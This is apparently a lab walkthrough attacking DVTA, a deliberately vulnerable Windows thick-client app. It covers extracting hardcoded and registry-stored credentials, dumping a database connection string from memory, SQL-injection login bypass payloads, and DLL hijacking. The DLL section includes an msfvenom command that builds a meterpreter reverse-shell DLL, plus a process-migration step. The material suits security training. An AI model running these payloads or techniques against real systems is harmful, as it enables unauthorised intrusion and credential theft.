# Hardcoded Strings

---

<aside>
💡 Tools used: Strings, DnSpy.

</aside>

## Strings.exe

- Using `strings`tool in **sysinternalsuite**, we will try to find any hardcoded strings in application.
- Run the below cmd in `cmd promot`. By using the provided cmd we can see a new output file named **strings.txt**  has been created.

```visual-basic
strings.exe <path-to-app> > <path-to-output>

#example
strings.exe C:\Users\Windows\Desktop\work\Original\DVTA.exe > C:\Users\Windows\Desktop\strings.txt  
```

![alt text](data/image-37.png)

- Now, open **strings.txt** file and see if any sensitive data is hardcoded.
- By using search filter we can see `ftp` creds are saved into the file.

![alt text](data/image-38.png)

---

## We can achieve the same using `dnSpy` tool:

- Open `dnSpy` tool and load the application into it.
- In this case we know that admin has ftp functionality enabled, so lets’ see for admin folder.

![alt text](data/image-39.png)

- By looking at the files, we found FTP credentials hardcoded into the file.

![alt text](data/image-40.png)

---

# Insecure Data Storage - Privilege Escalation

---

<aside>
💡 *Tools used: RegShot
Link:* https://sourceforge.net/projects/regshot/

</aside>

- Open `RegShot-x86` or one which works for you like `x64` application.

![alt text](data/image-41.png)

- By selecting **HTML Document,** click on 1st Shot (This will take shots of all registry before running the application).

![alt text](data/image-42.png)

- After finishing the 1st shot, open DVTA application and login using the regular user credentials and explore the application.

![alt text](data/image-43.png)

- Now, click on 2nd shot and wait until it finished.

![alt text](data/image-44.png)

- Then, click on **Compare,** in order to compare two captured registry shots data before and after running the application.

![alt text](data/image-45.png)

- After click on **Compare**, the HTML document will open in browser. Try to find the registry entries related to the DVTA application or simply use search method.
- After quick skim we got credentials data stored in plain text.

![alt text](data/image-46.png)

- We can also copy the registry key and find the entries in **Registry Editor**.

![alt text](data/image-47.png)

- Simply copy the Registry Key number and paste in search bar to find the DVTA registry data.

![alt text](data/image-48.png)

---

## Privilege Escalation

- Assume that we know another user’s username and let’s try to change the registry entry of username to another user’s username.
- By this means we can check if the application is making checks from client side or server side or the application is logging in on based of entries in Registry.

![alt text](data/image-49.png)

- Let’s close the application and reopen it, check and we can see now we are logged in as user “John”.

![alt text](data/image-50.png)

- Now, we can use the application as user John.

---

# Dumping Connection String from memory

---

<aside>
💡 *Tools Used: Process Hacker
Link:* https://processhacker.sourceforge.io/downloads.php

</aside>

## Obtaining Database Credentials:

| Scenario 1 | Scenario 2 |
| --- | --- |
| • Clear text Connection string is hard coded. | • Encrypted Connection string is hard coded. |
| • Connection String is seen in memory. | • Connection String is seen in memory. |

*In this case we are focusing on “**Scenario 2”.***

- Login using the regular user credentials, to load connection data into the memory.

![alt text](data/image-51.png)

- Open `Process Hacker` and look for **DVTA.exe,** Right click > Select **Properties.**

![alt text](data/image-52.png)

- Select **Memory** and click on **Strings.**

![alt text](data/image-53.png)

- Select all the options and click on **OK.**

![alt text](data/image-54.png)

- New window opens that contains bunch of data. So we can filter out data with specific contained word by selecting **Filter.**

![alt text](data/image-55.png)

- We can search for word **Data Source,** which is the common word in database connections.

![alt text](data/image-56.png)

- On applying the **Filter**, we have got decrypted credentials data in memory, simply we can copy the data string by selecting it and click on Copy.

![alt text](data/image-57.png)

- The next word we can search is **Decrypt**, which can also gives us useful results.

![alt text](data/image-58.png)

- So, we got decrypted “**dbpassword”,** copy the string and paste it in notepad.

![alt text](data/image-59.png)

- Till now we have collected the sensitive data shown in image below:

![alt text](data/image-60.png)

- Now, using the credentials we can try to connect to the database server.

![alt text](data/image-61.png)

- BOOM! we got successfully logged in. By this method a hacker can steal sensitive data from the database.

![alt text](data/image-62.png)

--- 
# SQL Injection

---

- SQL uses the below query to check the user/password in database. We will mess with the SQL query and try to break it.

```sql
Select * from users where usewrname='something_user' and password='something_password';

#Manipulated_Query
Select * from users where usewrname='x' or 'x'='x' and password='x' or 'x'='x';
```

- Let’s use the SQL payload to test it. Paste the below query in both username and password.

`x' or 'x'='x`

![alt text](data/image-63.png)

- In result we are logged in as user John.

![alt text](data/image-64.png)

- In case, if we are aware of usernames then we can use the query like:

`admin' or 'x'='y`

![alt text](data/image-65.png)

- So in result we are successfully logged in as admin user.

![alt text](data/image-66.png)

--- 

# Side Channel Data Leaks

---

<aside>
💡 Causes of Side Channel Data Leaks:
- Developers often use logging for debugging purposes during development.
- Developers may write debug logs into console or some sort of file on the disk when the application is moved into production.
- If these debug logs are not removed from the application, it can pose a security risk.
</aside>

- This time run application through **Console Window** using the cmd below.

```sql
<application.exe> > logs.txt

#Example
DVTA.exe > dvta_logs.txt  
```

![alt text](data/image-67.png)

- Application window will open, use the application normally as we use, try login with regular user credentials, browse the application.
- After doing a bit, we can logout and open the **dvta_log.txt** file to see the data.
- We have got sensitive data in our file.

![alt text](data/image-68.png)

- We can use this captured data to fully compromise the server.

---

# DLL Hijacking

---

<aside>
💡 **DLL = Dynamic Link Library**
A collection of code and resources that can be shared and reused by multiple programs in Windows. It helps to make programs more efficient by allowing code to be loaded into memory only when needed, promoting code reusability and modular design.

</aside>

## **DLL Load Order:**

In case App can’t able to load a DLL, which may available in system directory but the absolute path is not provided, in this case application follow the below order to find it

| DLL Load Order: |
| --- |
| • The directory from which the application is loaded.

• The current directory.

• The system directory (C:| (Windows) (System32\\).

• The 16-bit system directory.

• The Windows directory.

• The directories that are listed in the PATH environment variable. |

---

## How to find if a application is vulnerable to DLL hijacking?

***Assumptions:***

- We got initial foot hold on the target machine with low privileges.
- We found an application(DVTA) running with admin privileges.
- Find if it is vulnerable to DLL Hijacking and exploit it.

---

- Open **Process Monitor** and apply some filters. Firstly we’ll apply filter for **Process Name**.

![alt text](data/image-69.png)

- Second filter we’ll apply for **Path** which ends with dll.

![alt text](data/image-70.png)

- Third filter we’ll apply for **Results** that contains “Name Not Found”.

![alt text](data/image-71.png)

- So, when we initially loads the DVTA application we have got following entries.

![alt text](data/image-72.png)

- Let’s continue the process and login as regular user. In results we have got some more entries.

![alt text](data/image-73.png)

- On quick skim we have got 2 interesting DLL paths shown in image below.

![alt text](data/image-74.png)

- Now let’s jump to kali machine and build a malicious `dll` file using the cmd:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.1xx.xxx.133 LPORT=4444 -a x86 -f dll > SECUR32.dll`

- Duplicate the same DLL to another named DLL using cmd:

`cp SECUR32.dll DWrite.dll`

![alt text](data/image-75.png)

- Now, transfer the dll files to machine running dvta application, using Apache or python server.

![alt text](data/image-76.png)

- Download the files using browser in victim’s machine.

![alt text](data/image-77.png)

<aside>
💡 These files will trigger windows defender and makes problem in running the payload.
In this scenario, we are assuming that we have disabled the windows defender and there is no protection in place.

</aside>

- Place the malicious `dll` into the same directory where the application is. (Always look at the requested path in Process Monitor for dll)

![alt text](data/image-78.png)

- Setup the kali machine for listening reverse connection.

![alt text](data/image-79.png)

- Now, we are assuming when the user try to open the application we get triggered to a reverse shell on our kali machine.

![alt text](data/image-80.png)

- To keep shell alive, we can also migrate to another running processes using the cmd:
```powershell
migrate <Process_ID>
```

